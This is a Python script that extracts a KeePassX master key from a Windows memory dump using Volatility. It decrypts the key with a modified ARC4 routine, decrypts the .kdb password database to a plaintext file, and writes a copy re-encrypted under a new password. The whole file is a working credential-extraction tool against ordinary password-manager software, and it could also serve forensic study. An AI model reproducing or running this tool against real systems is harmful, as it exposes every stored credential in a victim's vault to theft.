#!/usr/bin/python
import sys, re, struct, subprocess, os, hashlib
from Crypto.Cipher import AES

# Global def
procname = "KeePassX.exe"
profile =  "WinXPSP3x86" #"Win7SP1x86" #"WinXPSP3x86" 
pkey = "0x00552140" # static in adr find the bin

def extractpid(dump, profile, procname):
    print " [*] Extract %s PID ..." % procname
    volshell = subprocess.Popen(["vol.py", "-f", dump, "--profile", profile, 
            "pslist"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE)

    result = volshell.communicate()[0]
    m = re.search(r"%s\s+(\d+) " % procname, result, re.MULTILINE)
    pid = m.group(1)
    print " [*] PID for %s %s" % (procname, pid)
    return pid

def memdump(dump, profile, pid):
    print " [*] Extract memdump for PID %s ..." % pid
    memdump_path = "/tmp/%s.dmp" % pid

    if not os.path.isfile(memdump_path):
        volshell = subprocess.Popen(["vol.py", "-f", dump, "--profile", profile, 
                "memdump", "--dump-dir", "/tmp/", "-p", pid],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE)

        volshell.communicate()

    f = open(memdump_path, 'r')
    data = f.read()
    f.close()

    #os.unlink(memdump_path)
    return data

def adrfinder(data):
    print ' [*] Search for encrypted master key...'
    print '*'*87
    print ' start  -  end   |    adr1    |    adr2    |    match'
    print '*'*87
    guess_adr = None
    for m in re.finditer(b"(.{4})\x20\x00{3}\x01.{3}(.{4})\x20\x00{3}\x01", data):
        if re.match(b"\x00{2}", m.group(1)):
            continue 

        adr1 = struct.unpack('<I', m.group(1))[0]
        adr2 = struct.unpack('<I', m.group(2))[0]
        
        if guess_adr == None:
            guess_adr = adr1
            
        print '%08x-%08x: 0x%08x | 0x%08x | %s' % (m.start(), m.end(), adr1, adr2, m.group(0).encode("hex"))

    print '*'*87
    print ' [*] Encrypted master key (guess): 0x%08x' % guess_adr
    return "0x%08x" % guess_adr

def passwordextract(dump, profile, pid, pkey, adr_password):
    print " [*] Extract crypted master key and ARC4 key from memory..."
    volshell = subprocess.Popen(["vol.py", "-f", dump, "--profile", profile, "volshell"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE)

    # Extract adr of ARC4 key from pointer
    result = volshell.communicate("cc(None,%s)\ndd(%s, 4)\n" % (pid, pkey))[0]
    m = re.search(r"^>>> (.{8})  (.{8})$", result, re.MULTILINE)
    adrKey = "0x%s" % m.group(2)
    print " [*] ARC4 at %s" % adrKey

    volshell = subprocess.Popen(["vol.py", "-f", dump, "--profile", profile, "volshell"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE)

    # Extract ARC4 key and crypted password hash
    result = volshell.communicate("cc(None,%s)\ndb(%s, 32)\ndb(%s, 32)\n" % (pid, adrKey, adr_password))[0]
    m = re.findall(r"(.{8})   (.*)    (.*)$", result, re.MULTILINE)
    key = (m[0][1] + m[1][1]).replace(' ', '')
    password = (m[2][1] + m[3][1]).replace(' ', '')
    print " [*] ARC4 key %s" % key
    print " [*] crypted master password hash %s" % password
    return (key, password)

# Fucked ARC4 in key prepare
def arc4(key, data):
    btBufDep = ((len(data) & 0xFF) << 1);
    x = 0
    box = range(256)
    for i in range(256):
        x = (x + box[i] + ord(key[i % len(key)]) + btBufDep) % 256 
        box[0], box[x] = box[x], box[0]

    x = y = 0
    out = []
    for char in data:
        x = (x + 1) % 256
        y = (y + box[x]) % 256
        box[x], box[y] = box[y], box[x]
        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))
    
    return ''.join(out)    

def checkkey(passworddb_file, masterkey):
    PasswordHash = masterkey.decode("hex")
    f = open(passworddb_file, 'rb')

    # Flags is a uint32
    f.seek(8, 0)
    Flags = f.read(4)
    Flags = struct.unpack('I', Flags)[0]
    #print "Flags %u" % Flags

    # FinalRandomSeed
    f.seek(16, 0)
    FinalRandomSeed = f.read(16)

    # Encryption IV
    EncryptionIV = f.read(16)

    # ContentHash
    f.seek(56,0)
    ContentsHash = f.read(32)

    # TransfRandomSeed
    TransfRandomSeed = f.read(32)

    # KeyTransfRounds uint32
    KeyTransfRounds = f.read(4)
    KeyTransfRounds = struct.unpack('I', KeyTransfRounds)[0]
    #print "KeyTransfRounds %u" % KeyTransfRounds 

    # Data
    f.seek(124,0) # To be sure
    Data = f.read()
    f.close()

    #print "RawMasterKey %s" % PasswordHash.encode("hex")

    # Key transform part (PasswordHash, TransfRandomSeed, KeyTransfRounds)
    # return a sha256 hash
    part1 = PasswordHash[:16]
    part2 = PasswordHash[16:]

    # Transform part
    crypt = AES.new(TransfRandomSeed, AES.MODE_ECB)
    for i in range(KeyTransfRounds):
        part1 = crypt.encrypt(part1)
    crypt = AES.new(TransfRandomSeed, AES.MODE_ECB)
    for i in range(KeyTransfRounds):
        part2 = crypt.encrypt(part2)


    # Construct the hash
    m = hashlib.sha256()
    m.update(part1)
    m.update(part2)
    TransfPasswordHash = m.digest()

    #print "MasterKey %s" % TransfPasswordHash.encode("hex")

    # Compute the true password hash
    m = hashlib.sha256()
    m.update(FinalRandomSeed)
    m.update(TransfPasswordHash)
    PasswordHash = m.digest()

    #print "FinalKey %s" % PasswordHash.encode("hex")
    #print "EncryptionIV %s" % EncryptionIV.encode("hex")

    # Decrypt data with the found hash
    if Flags & 2: # AES
        #print "AES"
        crypt = AES.new(PasswordHash, AES.MODE_CBC, EncryptionIV)
        DecData = crypt.decrypt(Data)
    elif Flags & 4: # TWOFISH
        print "TWOFISH not supported"
        sys.exit(1)
    else:
        print "Algo not supported"
        sys.exit(1)

    OffsetPad = ord(DecData[-1])
    #print "OffsetPad: %d" % OffsetPad
    DecData = DecData[:-OffsetPad]

    # Generate decrypted data hash
    m = hashlib.sha256()
    m.update(DecData)
    DecDataHash = m.digest()

    if DecDataHash != ContentsHash:
        print "Failed %s != %s" % (DecDataHash.encode("hex"), ContentsHash.encode("hex"))
        return 1
        
    filename = passworddb_file+".dec"
    print " [*] Hash match, you win :D"
    print " [*] Write decrypted content in %s" % filename
    f = open(filename, 'w')
    f.write(DecData)
    f.close()
    return 0

def password_change(passworddb_file, masterkey, new_password):
    PasswordHash = masterkey.decode("hex")
    f = open(passworddb_file, 'rb')

    # Flags is a uint32
    f.seek(8, 0)
    Flags = f.read(4)
    Flags = struct.unpack('I', Flags)[0]
    #print "Flags %u" % Flags

    # FinalRandomSeed
    f.seek(16, 0)
    FinalRandomSeed = f.read(16)

    # Encryption IV
    EncryptionIV = f.read(16)

    # ContentHash
    f.seek(56,0)
    ContentsHash = f.read(32)

    # TransfRandomSeed
    TransfRandomSeed = f.read(32)

    # KeyTransfRounds uint32
    KeyTransfRounds = f.read(4)
    KeyTransfRounds = struct.unpack('I', KeyTransfRounds)[0]
    #print "KeyTransfRounds %u" % KeyTransfRounds 

    # Data
    f.seek(124,0) # To be sure
    Data = f.read()
    f.close()

    #print "RawMasterKey %s" % PasswordHash.encode("hex")

    # Key transform part (PasswordHash, TransfRandomSeed, KeyTransfRounds)
    # return a sha256 hash
    part1 = PasswordHash[:16]
    part2 = PasswordHash[16:]

    # Transform part
    crypt = AES.new(TransfRandomSeed, AES.MODE_ECB)
    for i in range(KeyTransfRounds):
        part1 = crypt.encrypt(part1)
    crypt = AES.new(TransfRandomSeed, AES.MODE_ECB)
    for i in range(KeyTransfRounds):
        part2 = crypt.encrypt(part2)


    # Construct the hash
    m = hashlib.sha256()
    m.update(part1)
    m.update(part2)
    TransfPasswordHash = m.digest()

    #print "MasterKey %s" % TransfPasswordHash.encode("hex")

    # Compute the true password hash
    m = hashlib.sha256()
    m.update(FinalRandomSeed)
    m.update(TransfPasswordHash)
    PasswordHash = m.digest()

    #print "FinalKey %s" % PasswordHash.encode("hex")
    #print "EncryptionIV %s" % EncryptionIV.encode("hex")

    # Decrypt data with the found hash
    if Flags & 2: # AES
        #print "AES"
        crypt = AES.new(PasswordHash, AES.MODE_CBC, EncryptionIV)
        DecDataPad = crypt.decrypt(Data)
    elif Flags & 4: # TWOFISH
        print "TWOFISH not supported"
        sys.exit(1)
    else:
        print "Algo not supported"
        sys.exit(1)

    OffsetPad = ord(DecDataPad[-1])
    #print "OffsetPad: %d" % OffsetPad
    DecData = DecDataPad[:-OffsetPad]

    # Generate decrypted data hash
    m = hashlib.sha256()
    m.update(DecData)
    DecDataHash = m.digest()

    if DecDataHash != ContentsHash:
        print "Failed %s != %s" % (DecDataHash.encode("hex"), ContentsHash.encode("hex"))
        return 1
        
    filename = "New%s" % passworddb_file
    print " [*] Hash match, you win :D"
    print " [*] Now time to change password with %s in %s" % (new_password, filename)

    m = hashlib.sha256()
    m.update(new_password)
    PasswordHash = m.digest()

    # Key transform part (PasswordHash, TransfRandomSeed, KeyTransfRounds)
    # return a sha256 hash
    part1 = PasswordHash[:16]
    part2 = PasswordHash[16:]

    # Transform part
    crypt = AES.new(TransfRandomSeed, AES.MODE_ECB)
    for i in range(KeyTransfRounds):
        part1 = crypt.encrypt(part1)
    crypt = AES.new(TransfRandomSeed, AES.MODE_ECB)
    for i in range(KeyTransfRounds):
        part2 = crypt.encrypt(part2)


    # Construct the hash
    m = hashlib.sha256()
    m.update(part1)
    m.update(part2)
    TransfPasswordHash = m.digest()

    #print "MasterKey %s" % TransfPasswordHash.encode("hex")

    # Compute the true password hash
    m = hashlib.sha256()
    m.update(FinalRandomSeed)
    m.update(TransfPasswordHash)
    PasswordHash = m.digest()

    # encrypt pad data with the new key
    if Flags & 2: # AES
        #print "AES"
        crypt = AES.new(PasswordHash, AES.MODE_CBC, EncryptionIV)
        Data = crypt.encrypt(DecDataPad)
    elif Flags & 4: # TWOFISH
        print "TWOFISH not supported"
        sys.exit(1)
    else:
        print "Algo not supported"
        sys.exit(1)

    f = open(passworddb_file, 'rb')
    file_struct = f.read(124)
    f.close()

    f = open(filename, 'wb')
    f.write(file_struct)
    f.write(Data)
    f.close()
    print " [*] Password change complete! enjoy!"
    return 0

# Main
def main():
    print 'KeepassX memory dump password extractor'
    if len(sys.argv) != 4:
        print "%s <dump> <password_file.kdb> <newpassword>" % sys.argv[0]
        return

    dump = sys.argv[1]
    passworddb_file = sys.argv[2]
    new_password = sys.argv[3]

    pid = extractpid(dump, profile, procname)
    procmemdump = memdump(dump, profile, pid)
    adr_password = adrfinder(procmemdump)
    (key, password_crypted) = passwordextract(dump, profile, pid, pkey, adr_password)
    print " [*] Decrypt master key..."
    password_hash = arc4(key.decode("hex"), password_crypted.decode("hex"))

    print " [*] SHA256 master key hash: %s" % password_hash.encode("hex")
    print " [*] try to decrypt the file ..."
    ret = checkkey(passworddb_file, password_hash.encode("hex"))
    if ( ret == 0 ):
        print " [*] Change password ..."
        password_change(passworddb_file, password_hash.encode("hex"), new_password)

if __name__ == "__main__":
    main()
